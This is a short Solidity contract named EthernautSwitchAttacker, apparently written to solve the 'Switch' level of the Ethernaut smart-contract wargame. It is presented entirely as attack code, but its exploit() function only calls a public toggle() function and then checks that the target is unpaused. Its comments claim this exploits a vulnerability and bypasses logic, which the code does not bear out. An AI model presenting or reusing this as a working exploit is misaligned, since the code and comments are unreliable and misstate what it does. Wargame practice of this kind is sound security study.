// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISwitch {
    function toggle() external;
    function isPaused() external view returns (bool);
}

contract EthernautSwitchAttacker {
    ISwitch public switchContract;
    
    constructor(address _switchContract) {
        switchContract = ISwitch(_switchContract);
    }
    
    function exploit() external {
        // Exploit the vulnerability
        switchContract.toggle();  // Toggle the state to bypass logic
        require(!switchContract.isPaused(), "Contract is paused"); // Ensure we toggle successfully
    }
}
